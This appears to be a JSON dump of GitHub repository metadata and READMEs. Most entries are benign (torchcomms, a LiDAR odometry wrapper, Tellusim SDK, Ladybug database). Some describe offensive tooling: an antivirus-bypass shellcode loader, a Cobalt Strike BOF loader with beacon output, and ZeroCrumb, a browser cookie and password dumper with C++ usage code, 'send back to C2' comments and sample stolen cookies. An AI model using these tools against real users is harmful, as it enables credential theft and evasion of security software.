PyTorch\n\n##### NCCLX Backend\n\nIf you want to install the third-party dependencies directly from conda, run the following command:\n```bash\nUSE_SYSTEM_LIBS=1 ./build_ncclx.sh\n```\n\nIf you want to build and install the third-party dependencies from source, run the following command:\n```bash\n./build_ncclx.sh\n```\n\n##### RCCL Backend\n\nInstall some prerequisites\n```\nconda install conda-forge::glog=0.4.0 conda-forge::gflags conda-forge::fmt -y\n```\n\nEnvironment variables to find rocm/rccl headers\n```\nexport ROCM_HOME=/opt/rocm\nexport RCCL_INCLUDE=$ROCM_HOME/include/rccl\n```\n\n```bash\n./build_rccl.sh\n```\n\n#### Install torchcomms:\n\n```bash\n# Install PyTorch (if not already installed)\npip install -r requirements.txt\npip install --no-build-isolation -v .\n```\n\n### Build Configuration\n\nYou can customize the build by setting environment variables before running pip install:\n\n```bash\n# Enable/disable specific backends (ON/OFF or 1/0)\nexport USE_NCCL=ON    # Default: ON\nexport USE_NCCLX=ON   # Default: ON\nexport USE_GLOO=ON    # Default: ON\nexport USE_RCCL=OFF   # Default: OFF\n```\n\nThen run:\n\n```bash\n# Install PyTorch (if not already installed)\npip install -r requirements.txt\npip install --no-build-isolation -v .\n```\n\n## Quick Start Example\n\nHere's a simple example demonstrating synchronous `AllReduce` communication across multiple GPUs:\n\n```python\n#!/usr/bin/env python3\n# example.py\nimport torch\nfrom torchcomms import new_comm, ReduceOp\n\ndef main():\n    # Initialize TorchComm with NCCLX backend\n    device = torch.device(\"cuda\")\n    torchcomm = new_comm(\"nccl\", device, name=\"main_comm\")\n\n    # Get rank and world size\n    rank = torchcomm.get_rank()\n    world_size = torchcomm.get_size()\n\n    # Calculate device ID\n    num_devices = torch.cuda.device_count()\n    device_id = rank % num_devices\n    target_device = torch.device(f\"cuda:{device_id}\")\n\n    print(f\"Rank {rank}/{world_size}: Running on device {device_id}\")\n\n    # Create a tensor with rank-specific data\n    tensor = torch.full(\n        (1024,),\n        float(rank + 1),\n        dtype=torch.float32,\n        device=target_device\n    )\n\n    print(f\"Rank {rank}: Before AllReduce: {tensor[0].item()}\")\n\n    # Perform synchronous AllReduce (sum across all ranks)\n    torchcomm.all_reduce(tensor, ReduceOp.SUM, async_op=False)\n\n    # Synchronize CUDA stream\n    torch.cuda.current_stream().synchronize()\n\n    print(f\"Rank {rank}: After AllReduce: {tensor[0].item()}\")\n\n    # Cleanup\n    torchcomm.finalize()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Running the Example\n\nTo run this example with multiple processes (one per GPU):\n\n```bash\n# Using torchrun (recommended)\ntorchrun --nproc_per_node=2 example.py\n\n# Or using python -m torch.distributed.launch\npython -m torch.distributed.launch --nproc_per_node=2 example.py\n```\n\nTo run this example with multiple nodes:\n\n- Node 0\n```bash\ntorchrun --nnodes=2 --nproc_per_node=8 --node_rank=0 --rdzv-endpoint=\"<master-node>:<master-port>\" example.py\n```\n- Node 1\n```bash\ntorchrun --nnodes=2 --nproc_per_node=8 --node_rank=1 --rdzv-endpoint=\"<master-node>:<master-port>\" example.py\n```\n\nIn the example above, we perform the following steps:\n\n1. `new_comm()` creates a communicator with the specified backend\n2. Each process gets its unique rank and total world size\n3. Each rank creates a tensor with rank-specific values\n4. All tensors are summed across",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:26.429353"
  },
  {
    "basic_info": {
      "name": "bypass-all",
      "full_name": "Answerr/bypass-all",
      "owner": "Answerr",
      "description": "免杀所有杀软、bypass all，绕过WB、VT ，0检测。",
      "url": "https://github.com/Answerr/bypass-all",
      "clone_url": "https://github.com/Answerr/bypass-all.git",
      "ssh_url": "git@github.com:Answerr/bypass-all.git",
      "homepage": null,
      "created_at": "2025-10-10T06:26:38Z",
      "updated_at": "2025-10-26T23:09:43Z",
      "pushed_at": "2025-10-10T08:45:24Z"
    },
    "stats": {
      "stars": 124,
      "forks": 25,
      "watchers": 124,
      "open_issues": 0,
      "size": 3046
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 57610,
        "C": 52066,
        "Shell": 2287
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# bypass-all\n\n免责声明：\n\n视频中所有操作均在受控的靶机环境中完成，不存在任何实际攻击行为，请大家务必遵守法律法规，切勿将此类技术用于非法用途\n\n介绍：\n\narsenal-kit 二开：\n\n此项目为UDRL-VS二开、process inject kit二开 ，去除yara特征的profile，简单的shellcodeloader为单文件远程分离加载\n\n\n\n使用方法参考视频：\n\nhttps://www.bilibili.com/video/BV1Mp47z1EMW/?vd_source=23bb70e55009a3bee5844639552aeb7e\n\n\n\n证明：\n\n测试时间：2025.10.09\n\n \n\n \n\n![image-20251009170235870](images/image-20251009170235870.png)\n\n![image-20251009170527008](images/image-20251009170527008.png)\n\n![image-20251009170706366](images/image-20251009170706366.png) \n\n![image-20251009170734229](images/image-20251009170734229.png) \n\n![image-20251009170829808](images/image-20251009170829808.png) \n\n\n\n![image-20251009170926500](images/image-20251009170926500.png) \n\n\n\n![image-20251009170633248](images/image-20251009170633248.png)  \n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:27.560305"
  },
  {
    "basic_info": {
      "name": "InlineExecuteEx",
      "full_name": "0xTriboulet/InlineExecuteEx",
      "owner": "0xTriboulet",
      "description": "A BOF that's a BOF Loader",
      "url": "https://github.com/0xTriboulet/InlineExecuteEx",
      "clone_url": "https://github.com/0xTriboulet/InlineExecuteEx.git",
      "ssh_url": "git@github.com:0xTriboulet/InlineExecuteEx.git",
      "homepage": "",
      "created_at": "2025-10-12T21:57:23Z",
      "updated_at": "2025-10-27T00:31:39Z",
      "pushed_at": "2025-10-26T23:12:42Z"
    },
    "stats": {
      "stars": 120,
      "forks": 17,
      "watchers": 120,
      "open_issues": 0,
      "size": 8879
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 77553,
        "C": 39607,
        "Python": 30781,
        "Makefile": 1670
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "# InlineExcuteEx\nBeacon Object Files (BOFs) in the Cobalt Strike ecosystem are intended to be an abstraction of [Position Independent Code (PIC)](https://aff-wg.org/). To maximize\nthe benefits of this, Cobalt Strike pre-processes BOFs to strip away sections that are not needed to achieve code execution. This design\nconfers some advantages for users of the framework. It reduces the size of the BOF that Beacon receives from the Teamserver, and the BOF \nloader in Beacon is very small compared to other BOF implementations. Unfortunately, this pre-processing has the inadvertent effect of\nreducing the features available from a BOF because the additional information is not available to Beacon at load-time. `InlineExcuteEx`\nimplements [COFFLoader](https://github.com/trustedsec/COFFLoader) as a Cobalt Strike compatible BOF, which can be used to fire other BOFs\nin a more complete way than what is currently possible from Beacon.\n\nThe obvious trade here is that you lose the approximate lightness of PIC offered by Beacon's BOF loader, in favor of a heavier abstraction. This is a nuance that may or may not be relevant to your use case. The intent of this implementation is to offer users of the framework a *choice*.\n\n## Basic Usage\nLoad `inline-execute-ex.cna` from the `Script Manager`. This will make the `inline-execute-ex` command available to you.\n\n```\nBOF+\n====\n[EXPERIMENTAL] BOF Loader.\n\n\t[EXPERIMENTAL] I heard you like BOFs. So I put a BOF in your BOF.\n```\n\nYou can use the `help inline-execute-ex` command to get some usage information from the command line.\n\n```\nbeacon> help inline-execute-ex\n# 1 - a string containing the BOF file\n# 2 - the entry point to call\n# 3 - arguments to pass to the BOF file\n\nUsage: inline-execute-ex 'bof.o' 'go' 'hello world!'\n```\n\n## Drop-In Replacement for `beacon_inline_execute`\nConventional `.cna` scripts register an alias that calls `beacon_inline_execute` to task Beacon to run a BOF. If you want to use `InlineExecuteEx` instead of the default BOF loader for a capability, you can move the `inline-execute-ex.cna` script, the `Release` directory, and the `x64` directory to the same directory as your BOF's `.cna` script.\n\n```sh\n    Directory: C:\\CS-Situational-Awareness-BOF\\SA\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n[...snip...]\nd-----        10/15/2025   4:28 PM                Release\nd-----        10/15/2025   4:28 PM                x64\n-a----        10/15/2025   4:42 PM           2153 inline-execute-ex.cna\n-a----        10/15/2025   4:31 PM          45298 SA.cna\n```\n\nThen include the `inline-execute-ex.cna` in your BOF's cna script.\n```perl\n# SA.cna\ninclude(getFileProper(script_resource(\"inline-execute-ex.cna\"))); # This is the line you want to add\n\n%recordmapping = %(\nA => 1,\nNS => 2,\nMD => 3,\nMF => 4,\n[...snip...]\n```\n\nLastly, replace calls to `beacon_inline_execute` with `beacon_inline_execute_ex`.\n```perl\nalias dir {\n\tlocal('$params $keys $args $targetdir $subdirs $ttp $text');\n\n[...snip...]\n\n    # We changed the line below\n\tbeacon_inline_execute_ex($1, readbof($1, \"dir\", $msg, $ttp), \"go\", $args);\n}\n```\nThen reload your `.cna` in the `Script Manager`. If all goes well, you should see this when you run the alias.\n```sh\n[10/15 16:36:25] beacon> dir\n[10/15 16:36:25] [+] Running dir (T1083)\n[10/15 16:36:25] [*] Running dir (T1083)\n[10/15 16:36:25] [*] Running InlineExecuteEx. # <----- It works!\n[10/15 16:36:26] [+] host called home, sent: 23152 bytes\n[10/15 16:36:26] [+] received output:\nContents of .\\*:\n\t10/15/2025 16:25           <dir> .\n\t09/07/2025 15:20           <dir> ..\n\t10/12/2025 12:00          575216 beacon_x64.exe\n[...snip...]\n\t                        66840774 Total File Size for 2 File(s)\n\t                                                      8 Dir(s)\n\n[10/15 16:36:26] [+] received output:\n[+] Success!\n\n```\n\n## Beacon Object File Visual Studio Template\n\nSee the [BOF-VS](https://github.com/Cobalt-Strike/bof-vs) repository for more information about the template behind this BOF.",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:28.683702"
  },
  {
    "basic_info": {
      "name": "lidar_odometry_ros_wrapper",
      "full_name": "93won/lidar_odometry_ros_wrapper",
      "owner": "93won",
      "description": "LiDAR Odometry ROS2 Wrapper",
      "url": "https://github.com/93won/lidar_odometry_ros_wrapper",
      "clone_url": "https://github.com/93won/lidar_odometry_ros_wrapper.git",
      "ssh_url": "git@github.com:93won/lidar_odometry_ros_wrapper.git",
      "homepage": "",
      "created_at": "2025-09-27T14:17:58Z",
      "updated_at": "2025-10-26T21:12:49Z",
      "pushed_at": "2025-10-18T10:21:48Z"
    },
    "stats": {
      "stars": 120,
      "forks": 20,
      "watchers": 120,
      "open_issues": 1,
      "size": 8893
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 19344,
        "Python": 14123,
        "CMake": 4503
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# LiDAR Odometry ROS2 Wrapper\n\nThis package provides a ROS2 wrapper for the LiDAR Odometry system with Probabilistic Kernel Optimization (PKO). It enables real-time LiDAR-based odometry estimation in ROS2 environments.\n\n## Demo Video\n\n[![KITTI LiDAR Odometry Demo](https://img.youtube.com/vi/swrJY2EStrs/0.jpg)](https://www.youtube.com/watch?v=swrJY2EStrs)\n[![Mid360 LiDAR Odometry Demo](https://img.youtube.com/vi/HDPA_ILxCrE/0.jpg)](https://youtu.be/HDPA_ILxCrE)\n\n## Features\n\n- ⚡ Real-time LiDAR odometry processing\n- 🎯 Feature-based point cloud registration  \n- 🔧 Ceres Solver-based optimization with PKO\n- 📈 ROS2 native implementation\n- 🌐 TF2 transform broadcasting\n- 📊 Trajectory visualization\n- 🎮 Optional Pangolin viewer integration\n\n## Dependencies\n\n### ROS2 Dependencies\n- `rclcpp`\n- `sensor_msgs`\n- `nav_msgs` \n- `geometry_msgs`\n- `visualization_msgs`\n- `tf2` and `tf2_ros`\n- `pcl_ros` and `pcl_conversions`\n\n### System Dependencies  \n- Eigen3\n- PCL (Point Cloud Library)\n- Ceres Solver\n- OpenGL and GLEW\n- Pangolin (included as submodule)\n\n## Installation\n\n### 1. Setup Workspace and Clone Repository\n```bash\n# Create a new ROS2 workspace\nmkdir -p lidar_odom_ws/src\ncd lidar_odom_ws/src\n\n# Clone the repository\ngit clone https://github.com/93won/lidar_odometry_ros_wrapper.git\ncd lidar_odometry_ros_wrapper\n\n# Initialize and download submodules\ngit submodule update --init --recursive\n```\n\n### 2. Install System Dependencies\n```bash\n# Ubuntu 22.04\nsudo apt update\nsudo apt install -y \\\n    libeigen3-dev \\\n    libpcl-dev \\\n    libceres-dev \\\n    libgl1-mesa-dev \\\n    libglew-dev \\\n    pkg-config\n```\n\n### 3. Build the Package\n```bash\ncd ../../  # Go back to lidar_odom_ws root\ncolcon build --packages-select lidar_odometry_ros\nsource install/setup.bash\n```\n\n## Usage\n\n### Basic Usage\n```bash\n# Launch with default Velodyne topic\nros2 launch lidar_odometry_ros lidar_odometry.launch.py \\\n    config_file:=/path/to/your/workspace/lidar_odometry_ros_wrapper/lidar_odometry/config/kitti.yaml\n\n# Launch with custom topic (e.g., Livox)\nros2 launch lidar_odometry_ros lidar_odometry.launch.py \\\n    config_file:=/path/to/your/workspace/lidar_odometry_ros_wrapper/lidar_odometry/config/kitti.yaml \\\n    pointcloud_topic:=/livox/pointcloud \\\n    use_sim_time:=true\n```\n\n### Quick Start\n\n#### Option 1: KITTI Sample Data\nDownload and play the KITTI sample ROS bag file:\n```bash\n# Download KITTI sample bag\n# https://drive.google.com/file/d/1U0tRSsc1PbEj_QThOHcD8l3qFkma3zjc/view?usp=sharing\n\n# Terminal 1: Launch odometry system\nros2 launch lidar_odometry_ros lidar_odometry.launch.py \\\n    config_file:=/path/to/your/workspace/lidar_odometry_ros_wrapper/lidar_odometry/config/kitti.yaml \\\n    use_sim_time:=true\n\n# Terminal 2: Play KITTI bag file\nros2 bag play /path/to/kitti_sample.bag --clock\n```\n\n#### Option 2: Livox MID360 Sample Data\nDownload and play the Livox MID360 sample ROS bag file:\n```bash\n# Download Livox MID360 sample bag\n# https://drive.google.com/file/d/1UI6Qc5cdY8R61Odc7A6IU-jRWZgnCx2g/view?usp=sharing\n# Source: https://www.youtube.com/watch?v=u8siB0KLFLc\n\n# Terminal 1: Launch odometry system for Livox\nros2 launch lidar_odometry_ros lidar_odometry.launch.py \\\n    config_file:=/path/to/your/workspace/lidar_odometry_ros_wrapper/lidar_odometry/config/kitti.yaml \\\n    use_sim_time:=true \\\n    pointcloud_topic:=/livox/pointcloud\n\n# Terminal 2: Play Livox bag file\nros2 bag play /path/to/livox_mid360_sample.bag --clock\n```\n\n**Note**: The Livox sample data uses standard `sensor_msgs/PointCloud2` messages, not Livox custom message format.\n\n\n\n\n\n\n\n## KITTI Dataset Usage\n\n### 1. Download KITTI Dataset\n```bash\n# Create data directory\nmkdir -p ~/kitti_data\ncd ~/kitti_data\n\n# Download KITTI Odometry Dataset (example: sequence 00)\n# Visit: https://www.cvlibs.net/datasets/kitti/eval_odometry.php\n# Download velodyne laser data and poses\n\n# Expected structure:\n# ~/kitti_data/\n# ├── sequences/\n# │   └── 00/\n# │       ├── velodyne/\n# │       │   ├── 000000.bin\n# │       │   ├── 000001.bin\n# │       │   └── ...\n# │       └── poses.txt\n```\n\n### 2. Convert KITTI to ROS2 Bag\n```bash\n# Use the provided conversion script\ncd ~/ros2_ws/src/lidar_odometry_ros_wrapper/scripts\n\npython3 kitti_to_rosbag.py \\\n    --kitti_dir ~/kitti_data/sequences/07 \\\n    --output_bag ~/kitti_data/kitti_seq07.db3 \\\n    --topic_name /velodyne_points \\\n    --frame_id velodyne\n```\n\n### 3. Run Examples\n\n#### Option A: KITTI Dataset\n```bash\n# Terminal 1: Launch odometry system for KITTI\nros2 launch lidar_odometry_ros lidar_odometry.launch.py \\\n    config_file:=$(pwd)/lidar_odometry/config/kitti.yaml \\\n    use_sim_time:=true \\\n    pointcloud_topic:=/velodyne_points\n\n# Terminal 2: Play KITTI bag file\nros2 bag play ~/kitti_data/kitti_seq07.db3 --clock\n```\n\n#### Option B: Livox MID360 Dataset\n```bash\n# Terminal 1: Launch odometry system for Livox MID360\nros2 launch lidar_odometry_ros lidar_odometry.launch.py \\\n    config_file:=$(pwd)/lidar_odometry/config/kitti.yaml \\\n    use_sim_time:=true \\\n  ",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:29.804159"
  },
  {
    "basic_info": {
      "name": "ZeroCrumb",
      "full_name": "Sfregs/ZeroCrumb",
      "owner": "Sfregs",
      "description": "Dumping App Bound Protected Credentials & Cookies Without Privileges.",
      "url": "https://github.com/Sfregs/ZeroCrumb",
      "clone_url": "https://github.com/Sfregs/ZeroCrumb.git",
      "ssh_url": "git@github.com:Sfregs/ZeroCrumb.git",
      "homepage": null,
      "created_at": "2025-10-22T01:05:42Z",
      "updated_at": "2025-10-27T02:21:57Z",
      "pushed_at": "2025-10-27T02:21:54Z"
    },
    "stats": {
      "stars": 116,
      "forks": 2,
      "watchers": 116,
      "open_issues": 0,
      "size": 197
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 506127
      },
      "license": "MIT License",
      "topics": [
        "appbound-encryption",
        "browser-cookies",
        "cheat",
        "chrome",
        "cookie-decryptor",
        "decryption",
        "exploit",
        "external",
        "gaming",
        "hack",
        "injector",
        "internal",
        "loader",
        "malware",
        "mod",
        "tool",
        "trainer",
        "undetected"
      ]
    },
    "content": {
      "readme": "\n# ZeroCrumb\n\nDumping App Bound Protected Credentials & Cookies Without Privileges.\n\n## Explanation\n\nAfter this, ZeroCrumb decrypts the cookies/passwords for the specified browser with the key fetched earlier.\n\n## Merits With The Named Pipe Approach\nUsage of named pipes in ZeroCrumb allows any program, As long as it can use the Windows API, To connect to the ZeroCrumb named pipe and read the App Bound Key from it.\n\n## Using ZeroCrumb As A Library\nIf you want to use ZeroCrumb as a library, You will need to compile a DLL that exports a function that does the hollowing of chrome with the key dumper. You might also need to embed the key dumper PE in the .rsrc section of the compiled DLL and later fetch it with the application resources Windows APIs.\n\n## Usage\nYou can run this in any directory of your choice as long as the key dumper is in the same directory.\n```\nZeroCrumb.exe <BROWSER_TYPE> <DUMP_TYPE>\n```\n```\nBrowser Types:\nChrome -> 0\nBrave -> 1\nEdge -> 2\n\nDump Types:\nCookies\nPasswords\n```\n\n## Code Usage\nZeroCrumb provides an easy-to-use **CookieReader** & **PasswordReader** classes:\n```cpp\nauto reader = new CookieReader(cookiesPath.c_str(), key);\n\nreader->initSqliteDb();\nreader->prepare(queries::cookies);\nreader->populateCookies();\n\nfor (auto& cookie : reader->cookies) {\nstring name = cookie->name;\nstring site = cookie->site;\nstring path = cookie->path;\nstring cookieValue = cookie->cookie;\n// dump to file, send back to C2, etc...\n}\n```\n\n```cpp\n// keep in mind passwords aren't encrypted using the app bound key (yet)\nauto reader = new PasswordReader(passwordsPath.c_str(), key);\n\nreader->initSqliteDb();\nreader->prepare(queries::passwords);\nreader->populatePasswords();\n\nfor (auto& password : reader->passwords) {\n\nauto name = password->name;\nauto site = password->site;\nauto passwordValue = password->password;\n// dump to file, send back to C2, etc...\n}\n```\n\n## Depedencies\n```\nsqlite3\nlibsodium\n```\n\n## Output Example\n```\n$ ZeroCrumb.exe 0 Cookies\n[*] Reading From Pipe...\nApp Bound Key: 980f8ea8af3299d966a26242.....\n============\nName: SIDCC\nSite: .\nPath: /\nCookie: AKEyXzXxD19T0KLMkrMC-eUXkrnEFi92OXq6rj1vydvmdL73olBVQGRQ4cG_hK5sqPhO1rLd1CM\n============\nName: __Secure-1PSIDCC\nSite: .\nPath: /\nCookie: AKEyXzXXC8_MNDlVbAaw512aXu-QJkl0uKNW66rhjeufotzoJhT3OPN5TuCQnfKS8l57_WGfDw\n============\nName: __Secure-3PSIDCC\nSite: .\nPath: /\nCookie: AKEyXzVVySM4FWl9itegCN2evcSmBvGc7_iXHqkKZ6VYPKmR--_LsHx1Aflar6SU4nyJiDaFq028\n============\nName: udid\nSite: .\nPath: /\nCookie: 0dd5b8bb-8c5b-47f3-87f9-1db8fa7d885f\n============\n```\n\n## Notes\nYou can modify ZeroCrumb to work with any type of credential other than cookies & passwords.\n\n## Issues\n- Debug build doesn't output the correct key\n\n## Disclaimer\nThis is by no means the most stealthy implementation of this bypass, It can get detected by checking for specific strings, hooking APIs, etc.\n\nBy the time I'm testing this, It got past Windows Defender but I haven't checked other AVs.\n\nI'll leave making the bypass stealthier as an exercise for the user if this bypass implementation gets signatured in the future.\n\n## Credits\n\n\n\n\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:30.929333"
  },
  {
    "basic_info": {
      "name": "Tellusim_Core_SDK",
      "full_name": "Tellusim/Tellusim_Core_SDK",
      "owner": "Tellusim",
      "description": "Cross-platform C++ SDK for graphics, compute, and simulation. Supports GPU-accelerated algorithms, meshes, images, and UI, with bindings for C#, Rust, Swift, and Python. Prebuilt builds and docs available.",
      "url": "https://github.com/Tellusim/Tellusim_Core_SDK",
      "clone_url": "https://github.com/Tellusim/Tellusim_Core_SDK.git",
      "ssh_url": "git@github.com:Tellusim/Tellusim_Core_SDK.git",
      "homepage": null,
      "created_at": "2025-10-05T18:59:01Z",
      "updated_at": "2025-10-23T11:26:33Z",
      "pushed_at": "2025-10-21T23:59:26Z"
    },
    "stats": {
      "stars": 104,
      "forks": 8,
      "watchers": 104,
      "open_issues": 0,
      "size": 1253939
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 13224408,
        "Rust": 3503871,
        "C#": 1867374,
        "Java": 1774780,
        "C": 792734,
        "JavaScript": 91840,
        "Python": 44929,
        "Swift": 34730,
        "GLSL": 34664,
        "HTML": 11789,
        "Kotlin": 6623,
        "Shell": 6460,
        "CSS": 3318,
        "PHP": 341
      },
      "license": "Other",
      "topics": []
    },
    "content": {
      "readme": "# Tellusim Core SDK\n\nTellusim Core SDK is the foundational layer of the Tellusim Engine, providing low-level functionality for high-performance graphics, compute, and application development across multiple platforms and devices. It offers a unified C++ API designed to abstract hardware and OS differences, enabling developers to write portable and scalable applications in graphics, simulation, visualization, and AI.\n\nThe SDK includes comprehensive support for meshes, images, user interfaces, and GPU-accelerated algorithms such as radix sort, bounding volume hierarchies (BVH), fast Fourier transforms (FFT), and GPU-driven computational graph framework for machine learning and advanced data processing.\n\nIn addition to C++, the SDK provides bindings and interoperability for other languages such as C#, Rust, Swift, Python, Java, and JavaScript, making it suitable for use in native mobile and desktop applications as well as game and graphics engines.\n\nHappy coding, and have fun creating with Tellusim!\n\n## Licensing\n\n* *Tellusim Core SDK* is free for educational use by students, teachers, and academic institutions.\n* *Tellusim Core SDK* is free for non-commercial research by individuals or non-profit organizations.\n* *Tellusim Core SDK* is free for individuals and companies with total annual revenue under USD $200,000.\n* *Tellusim Core SDK* is free for evaluation, testing, learning, and other non-commercial experimentation.\n* *Tellusim Core SDK* is free for open-source, non-commercial projects distributed under OSI-approved licenses (MIT, BSD, GPL, LGPL, or Apache 2.0), provided such projects generate no revenue and do not sell, license, or otherwise monetize software built with the Tellusim Core SDK.\n* *Tellusim Core SDK* may be redistributed unmodified, along with binaries built with it, as part of free or open-source projects, provided the SDK itself is not sold, sublicensed, or rented for a fee.\n* Any other use, including production deployment, commercial projects, or client-facing demonstrations, requires a Tellusim Commercial License.\n\nFor full license terms, see the [Tellusim Core SDK LICENSE](https://github.com/Tellusim/Tellusim_Core_SDK?tab=License-1-ov-file#readme)\n\nFor inquiries, visit: [Tellusim Services](https://tellusim.com/services/)\n\n## Documentation and Support\n\n* [Tellusim Core SDK Documentation](https://docs.tellusim.com/core)\n* [Discord Channel](https://discord.gg/WmCGx6pvqY)\n* [Support Forum](https://forum.tellusim.com/)\n\n## Platforms\n\nPlease choose the correct branch for your platform:\n\n| Platform      | Branch |\n|---------------|--------|\n| Windows x64   | [Windows x64 Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/windows_x64) |\n| Windows arm64 | [Windows arm64 Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/windows_arm64) |\n| Linux x64     | [Linux x64 Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/linux_x64) |\n| Linux arm64   | [Linux arm64 Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/linux_arm64) |\n| macOS x64     | [macOS x64 Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/macos_x64) |\n| macOS arm64   | [macOS arm64 Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/macos_arm64) |\n| Android       | [Android Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/android) |\n| iOS           | [iOS Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/ios) |\n| tvOS          | [tvOS Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/tvos) |\n| Web           | [Web Branch](https://github.com/Tellusim/Tellusim_Core_SDK/tree/emscripten) |\n\n# Graphics\n\n## [Clustered Lights](https://github.com/Tellusim/Tellusim_Core_SDK/tree/main/samples/graphics/lights/)\n\nForward shading with 16384 dynamic lights. This algorithm is compatible with deferred shading and transparent objects.\n\n[![Clustered Lights](utils/browser/images/graphics/graphics_lights.jpg)](https://github.com/Tellusim/Tellusim_Core_SDK/tree/main/samples/graphics/lights/)\n\n---\n\n## [Meshlet Render](https://github.com/Tellusim/Tellusim_Core_SDK/tree/main/samples/graphics/meshlet/)\n\nA massive meshlets rendering example with Mesh Shader for hardware and Compute Shader for software rasterization.  \n'1' activates Instancing mode.  \n'2' activates Mesh Shader mode.  \n'3' activates Compute rasterization mode.\n\n[![Meshlet Render](utils/browser/images/graphics/graphics_meshlet.jpg)](https://github.com/Tellusim/Tellusim_Core_SDK/tree/main/samples/graphics/meshlet/)\n\n---\n\n## [Mesh RayTracing](https://github.com/Tellusim/Tellusim_Core_SDK/tree/main/samples/graphics/traversal/)\n\nTraversal class for the simple raytracing pipeline access. Vulkan or Direct3D12 API is required.\n\n[![Mesh RayTracing](utils/browser/images/graphics/graphics_traversal.jpg)](https://github.com/Tellusim/Tellusim_Core_SDK/tree/main/samples/graphics/traversal/)\n\n---\n\n## [Mesh RayQuery](https://github.com/Tellusim/Tellusim_Core_SDK/tree/main/samples/graphics/tracing/)\n\nRay Query raytracing of animated sc",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:32.036031"
  },
  {
    "basic_info": {
      "name": "ladybug",
      "full_name": "LadybugDB/ladybug",
      "owner": "LadybugDB",
      "description": "LadybugDB a graph database",
      "url": "https://github.com/LadybugDB/ladybug",
      "clone_url": "https://github.com/LadybugDB/ladybug.git",
      "ssh_url": "git@github.com:LadybugDB/ladybug.git",
      "homepage": "https://ladybugdb.com/",
      "created_at": "2025-10-07T18:33:08Z",
      "updated_at": "2025-10-27T01:20:25Z",
      "pushed_at": "2025-10-27T00:37:56Z"
    },
    "stats": {
      "stars": 104,
      "forks": 5,
      "watchers": 104,
      "open_issues": 19,
      "size": 232717
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 8294130,
        "Cypher": 2194028,
        "Python": 580516,
        "JavaScript": 249246,
        "Java": 159157,
        "Rust": 138738,
        "CMake": 114271,
        "C": 80956,
        "ANTLR": 56079,
        "Makefile": 13495,
        "HTML": 11709,
        "Shell": 2468,
        "Dockerfile": 250
      },
      "license": "MIT License",
      "topics": [
        "database",
        "graph"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n  <picture>\n    <!-- <source srcset=\"https://ladybugdb.com/img/lbug-logo-dark.png\" media=\"(prefers-color-scheme: dark)\"> -->\n    <img src=\"https://ladybugdb.com/logo.png\" height=\"100\" alt=\"Ladybug Logo\">\n  </picture>\n</div>\n\n<br>\n\n<p align=\"center\">\n  <a href=\"https://github.com/LadybugDB/ladybug/actions\">\n    <img src=\"https://github.com/LadybugDB/ladybug/actions/workflows/ci-workflow.yml/badge.svg?branch=master\" alt=\"Github Actions Badge\"></a>\n  <a href=\"https://discord.gg/VtX2gw9Rug\">\n    <img src=\"https://img.shields.io/discord/1196510116388806837?logo=discord\" alt=\"discord\" /></a>\n  <a href=\"https://twitter.com/lbugdb\">\n    <img src=\"https://img.shields.io/badge/follow-@lbugdb-1DA1F2?logo=twitter\" alt=\"twitter\"></a>\n</p>\n\n# Ladybug\nLadybug is an embedded graph database built for query speed and scalability. Ladybug is optimized for handling complex analytical workloads\non very large databases and provides a set of retrieval features, such as a full text search and vector indices. Our core feature set includes:\n\n- Flexible Property Graph Data Model and Cypher query language\n- Embeddable, serverless integration into applications\n- Native full text search and vector index\n- Columnar disk-based storage\n- Columnar sparse row-based (CSR) adjacency list/join indices\n- Vectorized and factorized query processor\n- Novel and very fast join algorithms\n- Multi-core query parallelism\n- Serializable ACID transactions\n- Wasm (WebAssembly) bindings for fast, secure execution in the browser\n\nLadybug is being developed by [LadybugDB Developers](https://github.com/LadybugDB) and\nis available under a permissible license. So try it out and help us make it better! We welcome your feedback and feature requests.\n\nThe database was formerly known as [Kuzu](https://github.com/kuzudb/kuzu).\n\n## Installation\n\n> [!WARNING]\n> Many of these binary installation methods are not functional yet. We need to work through package names, availability and convention issues.\n> For now, use the build from source method.\n\n| Language | Installation                                                           |\n| -------- |------------------------------------------------------------------------|\n| Python   | `pip install lbug`                                                     |\n| NodeJS   | `npm install lbug`                                                     |\n| Rust     | `cargo add lbug`                                                       |\n| Go       | `go get github.com/lbugdb/go-lbug`                                     |\n| Swift    | [lbug-swift](https://github.com/lbugdb/lbug-swift)                     |\n| Java     | [Maven Central](https://central.sonatype.com/artifact/com.lbugdb/lbug) |\n| C/C++    | [precompiled binaries](https://github.com/LadybugDB/ladybug/releases/latest) |\n| CLI      | [precompiled binaries](https://github.com/LadybugDB/ladybug/releases/latest) |\n\nTo learn more about installation, see our [Installation](https://docs.ladybugdb.com/installation) page.\n\n## Getting Started\n\nRefer to our [Getting Started](https://docs.ladybugdb.com/get-started/) page for your first example.\n\n## Build from Source\n\nYou can build from source using the instructions provided in the [developer guide](https://kuzudb.github.io/docs/developer-guide/).\n\n## Contributing\nWe welcome contributions to Ladybug. If you are interested in contributing to Ladybug, please 